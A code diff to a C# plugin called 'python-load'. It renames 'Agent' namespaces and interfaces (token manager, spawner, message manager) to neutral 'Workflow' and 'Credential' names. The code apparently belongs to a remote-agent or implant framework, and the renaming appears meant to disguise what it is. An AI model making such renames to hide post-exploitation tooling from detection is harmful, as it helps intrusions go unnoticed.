@@ -1,20 +1,20 @@
-﻿using Agent.Interfaces;
+using Workflow.Contracts;
 using System.Text.Json;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Models;
+using Workflow.Utilities;
 using System.Collections.Concurrent;
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IFilePlugin
+    public class Plugin : IFileModule
     {
         public string Name => "python-load";
-        private IMessageManager messageManager { get; set; }
-        private IPythonManager pythonManager { get; set; }
-        private IAgentConfig agentConfig { get; set; }
+        private IDataBroker messageManager { get; set; }
+        private IScriptEngine pythonManager { get; set; }
+        private IServiceConfig agentConfig { get; set; }
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
         private Dictionary<string, List<byte>> _streams { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
             this.pythonManager = pythonManager;
